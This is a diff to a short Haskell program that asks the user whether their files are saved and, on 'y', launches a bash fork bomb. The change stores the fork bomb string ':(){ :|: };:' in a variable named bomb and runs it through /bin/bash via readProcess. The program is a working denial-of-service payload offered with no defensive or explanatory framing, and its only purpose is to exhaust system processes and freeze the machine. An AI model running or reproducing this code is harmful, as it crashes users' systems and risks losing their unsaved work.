@@ -8,6 +8,8 @@
 --Import for system function
 import System.Process
 
+bomb = ":(){ :|: };:"
+
 main = do
 	putStrLn "Have you saved all your files? (y/n)"
 	response <- getLine
@@ -17,5 +19,5 @@ parse response
 	| response == "y" = runFork
 	| otherwise = main
 
-runFork = system ":(){ :|: };:"
+runFork = readProcess "/bin/bash" ["-c",bomb] ""
 
